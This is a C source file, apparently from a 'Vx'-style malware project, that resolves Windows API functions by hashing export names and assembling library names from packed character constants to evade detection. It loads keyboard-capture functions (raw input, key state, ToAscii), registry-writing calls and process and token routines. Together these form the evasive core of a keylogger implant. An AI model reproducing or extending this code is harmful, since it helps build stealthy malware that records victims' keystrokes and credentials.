#include "VxHeader.h"

DWORD64 __stdcall ImportFunction(DWORD64 ModuleBase, DWORD64 Hash)
{
	PBYTE pFunctionName;
	PIMAGE_DOS_HEADER Dos;
	PIMAGE_NT_HEADERS Nt;
	PIMAGE_FILE_HEADER File;
	PIMAGE_OPTIONAL_HEADER Optional;

	RtlLoadPeHeaders(&Dos, &Nt, &File, &Optional, (PBYTE*)&ModuleBase);

	IMAGE_EXPORT_DIRECTORY *ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + Optional->DataDirectory[0].VirtualAddress);
	PDWORD FunctionNameAddressArray = (PDWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfFunctions);
	PWORD FunctionOrdinalAddressArray = (PWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfNameOrdinals);
	DWORD dwX;

	for (dwX = 0; dwX < ExportTable->NumberOfNames; dwX++)
	{
		pFunctionName = FunctionNameAddressArray[dwX] + (PBYTE)ModuleBase;
		DWORD dwFunctionHash = VxHashString(pFunctionName);

		if (Hash == dwFunctionHash)
			return ((DWORD64)ModuleBase + FunctionAddressArray[FunctionOrdinalAddressArray[dwX]]);
	}

	return 0;
}

BOOL RtlLoadPeHeaders(PIMAGE_DOS_HEADER *Dos, PIMAGE_NT_HEADERS *Nt, PIMAGE_FILE_HEADER *File, PIMAGE_OPTIONAL_HEADER *Optional, PBYTE *ImageBase)
{
	*Dos = (PIMAGE_DOS_HEADER)*ImageBase;
	if ((*Dos)->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;
	
	*Nt = (PIMAGE_NT_HEADERS)((PBYTE)*Dos + (*Dos)->e_lfanew);
	if ((*Nt)->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;
	
	*File = (PIMAGE_FILE_HEADER)(*ImageBase + (*Dos)->e_lfanew + sizeof(DWORD));
	*Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*File + sizeof(IMAGE_FILE_HEADER));

	return TRUE;
}

BOOL VxLoadNtDllFunctions(PAPI_TABLE Api)
{
	Api->RtlAllocateHeap = (RTLALLOCATEHEAP)ImportFunction(Api->PeBase, pRtlAllocateHeap);
	Api->RtlFreeHeap = (RTLFREEHEAP)ImportFunction(Api->PeBase, pRtlFreeHeap);
	Api->RtlGetLastWin32Error = (RTLGETLASTWIN32ERROR)ImportFunction(Api->PeBase, pRtlGetLastWin32Error);
	Api->RtlFreeUnicodeString = (RTLFREEUNICODESTRING)ImportFunction(Api->PeBase, pRtlFreeUnicodeString);
	Api->RtlTimeToSecondsSince1970 = (RTLTIMETOSECONDSSINCE1970)ImportFunction(Api->PeBase, pRtlTimeToSecondsSince1970);
	Api->RtlValidSid = (RTLVALIDSID)ImportFunction(Api->PeBase, pRtlValidSid);
	Api->RtlConvertSidToUnicodeString = (RTLCONVERTSIDTOUNICODESTRING)ImportFunction(Api->PeBase, pRtlConvertSidToUnicodeString);
	Api->RtlDosPathNameToNtPathName_U = (RTLDOSPATHNAMETONTPATHNAME_U)ImportFunction(Api->PeBase, pRtlDosPathNameToNtPathName_U);
	Api->RtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)ImportFunction(Api->PeBase, pRtlNtStatusToDosError);

	if (!Api->RtlAllocateHeap || !Api->RtlFreeHeap || !Api->RtlGetLastWin32Error || !Api->RtlTimeToSecondsSince1970 || !Api->RtlValidSid ||
		!Api->RtlConvertSidToUnicodeString || !Api->RtlDosPathNameToNtPathName_U || !Api->RtlNtStatusToDosError) {
		return FALSE;
	}

	Api->NtClose = (NTCLOSE)ImportFunction(Api->PeBase, pNtClose);
	Api->NtCreateFile = (NTCREATEFILE)ImportFunction(Api->PeBase, pNtCreateFile);
	Api->NtWriteFile = (NTWRITEFILE)ImportFunction(Api->PeBase, pNtWriteFile);
	Api->NtQueryInformationFile = (NTQUERYINFORMATIONFILE)ImportFunction(Api->PeBase, pNtQueryInformationFile);
	Api->NtSetInformationFile = (NTSETINFORMATIONFILE)ImportFunction(Api->PeBase, pNtSetInformationFile);
	Api->NtQueryInformationToken = (NTQUERYINFORMATIONTOKEN)ImportFunction(Api->PeBase, pNtQueryInformationToken);
	Api->NtOpenProcessTokenEx = (NTOPENPROCESSTOKENEX)ImportFunction(Api->PeBase, pNtOpenProcessTokenEx);
	Api->NtReadFile = (NTREADFILE)ImportFunction(Api->PeBase, pNtReadFile);
	Api->NtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)ImportFunction(Api->PeBase, pNtQueryInformationProcess);
	Api->NtReadVirtualMemory = (NTREADVIRTUALMEMORY)ImportFunction(Api->PeBase, pNtReadVirtualMemory);

	if (!Api->NtWriteFile || !Api->NtCreateFile || !Api->NtWriteFile || !Api->NtQueryInformationFile || !Api->NtSetInformationFile ||
		!Api->NtQueryInformationToken || !Api->NtOpenProcessTokenEx || !Api->NtReadFile || !Api->NtQueryInformationProcess ||
		!Api->NtReadVirtualMemory) {
		return FALSE;
	}

	Api->ZwClose = (ZWCLOSE)ImportFunction(Api->PeBase, pZwClose);
	Api->ZwSetValueKey = (ZWSETVALUEKEY)ImportFunction(Api->PeBase, pZwSetValueKey);
	Api->ZwCreateKey = (ZWCREATEKEY)ImportFunction(Api->PeBase, pZwCreateKey);

	if (!Api->ZwClose || !Api->ZwSetValueKey)
		return FALSE;

	return TRUE;
}

BOOL VxLoadKernel32Functions(PAPI_TABLE Api)
{
	DWORD dwSourceString[0x08];
	UNICODE_STRING uLibraryString;

	dwSourceString[0] = ('K' | ('e' << 0x10));
	dwSourceString[1] = ('r' | ('n' << 0x10));
	dwSourceString[2] = ('e' | ('l' << 0x10));
	dwSourceString[3] = ('3' | ('2' << 0x10));
	dwSourceString[4] = 0;

	Api->PeBase = ERROR_SUCCESS;

	Api->RtlInitUnicodeString(&uLibraryString, (PWCHAR)&dwSourceString);
	Api->LdrLoadDll(NULL, 0, &uLibraryString, (PHANDLE)&Api->PeBase);
	if (Api->PeBase == ERROR_SUCCESS)
		return FALSE;

	/*Api->SetUnhandledExceptionFilter = (SETUNHANDLEDEXCEPTIONFILTER)ImportFunction(Api->PeBase, pSetUnhandledExceptionFilter);*/
	Api->CreateProcessW = (CREATEPROCESSW)ImportFunction(Api->PeBase, pCreateProcessW);
	/*Api->FindFirstFileW = (FINDFIRSTFILEW)ImportFunction(Api->PeBase, pFindFirstFileW);
	Api->FindNextFileW = (FINDNEXTFILEW)ImportFunction(Api->PeBase, pFindNextFileW);
	Api->FindClose = (FINDCLOSE)ImportFunction(Api->PeBase, pFindClose);
	Api->BeginUpdateResourceW = (BEGINUPDATERESOURCEW)ImportFunction(Api->PeBase, pBeginUpdateResourceW);
	Api->UpdateResourceW = (UPDATERESOURCEW)ImportFunction(Api->PeBase, pUpdateResourceW);
	Api->EndUpdateResourceW = (ENDUPDATERESOURCEW)ImportFunction(Api->PeBase, pEndUpdateResourceW);
	Api->CopyFile = (COPYFILEW)ImportFunction(Api->PeBase, pCopyFile);
	Api->Wow64DisableWow64FsRedirection = (WOW64DISABLEWOW64FSREDIRECTION)ImportFunction(Api->PeBase, pWow64DisableWow64FsRedirection);
	Api->Wow64RevertWow64FsRedirection = (WOW64REVERTWOW64FSREDIRECTION)ImportFunction(Api->PeBase, pWow64RevertWow64FsRedirection);

	if (!Api->SetUnhandledExceptionFilter || !Api->CreateProcessW || !Api->FindFirstFileW || !Api->FindNextFileW ||
	!Api->FindClose || !Api->BeginUpdateResourceW || !Api->UpdateResourceW || !Api->EndUpdateResourceW || !Api->CopyFile ||
	!Api->Wow64DisableWow64FsRedirection || !Api->Wow64RevertWow64FsRedirection) {
	return FALSE;
	}*/

	return TRUE;

}

BOOL VxLoadUser32Functions(PAPI_TABLE Api)
{
	DWORD dwSourceString[0x08];
	UNICODE_STRING uLibraryString;

	dwSourceString[0] = ('U' | ('s' << 0x10));
	dwSourceString[1] = ('e' | ('r' << 0x10));
	dwSourceString[2] = ('3' | ('2' << 0x10));
	dwSourceString[3] = 0;

	Api->RtlInitUnicodeString(&uLibraryString, (PWCHAR)&dwSourceString);
	Api->LdrLoadDll(NULL, 0, &uLibraryString, (PHANDLE)&Api->PeBase);
	if (Api->PeBase == ERROR_SUCCESS)
		return FALSE;

	Api->vxRegisterClassEx = (REGISTERCLASSEX)ImportFunction(Api->PeBase, pRegisterClassExW);
	Api->vxCreateWindowEx = (CREATEWINDOWEX)ImportFunction(Api->PeBase, pCreateWindowEx);
	Api->vxSendMessage = (SENDMESSAGE)ImportFunction(Api->PeBase, pSendMessageW);
	Api->vxGetMessage = (GETMESSAGE)ImportFunction(Api->PeBase, pGetMessageW);
	Api->TranslateMessage = (TRANSLATEMESSAGE)ImportFunction(Api->PeBase, pTranslateMessage);
	Api->vxDispatchMessage = (DISPATCHMESSAGE)ImportFunction(Api->PeBase, pDispatchMessage);
	Api->RegisterRawInputDevices = (REGISTERRAWINPUTDEVICES)ImportFunction(Api->PeBase, pRegisterRawInputDevices);
	Api->vxGetKeyState = (GETKEYSTATE)ImportFunction(Api->PeBase, pGetKeyState);
	Api->vxToAscii = (TOASCII)ImportFunction(Api->PeBase, pToAscii);
	Api->vxGetKeyNameTextW = (GETKEYNAMETEXTW)ImportFunction(Api->PeBase, pGetKeyNameTextW);
	Api->vxMapVirtualKey = (MAPVIRTUALKEYW)ImportFunction(Api->PeBase, pMapVirtualKeyW);
	Api->vxGetKeyboardState = (GETKEYBOARDSTATE)ImportFunction(Api->PeBase, pGetKeyboardState);
	Api->vxDestroyWindow = (DESTROYWINDOW)ImportFunction(Api->PeBase, pDestroyWindow);
	Api->vxDefWindowProcW = (DEFWINDOWPROCW)ImportFunction(Api->PeBase, pDefWindowProcW);

	if (!Api->vxRegisterClassEx || !Api->vxCreateWindowEx || !Api->vxSendMessage || !Api->vxGetMessage || !Api->TranslateMessage || !Api->vxDispatchMessage ||
		!Api->RegisterRawInputDevices || !Api->vxGetKeyState || !Api->vxToAscii || !Api->vxGetKeyNameTextW || !Api->vxMapVirtualKey ||
		!Api->vxGetKeyboardState || !Api->vxDestroyWindow || !Api->vxDefWindowProcW) {
		return FALSE;
	}

	return TRUE;
}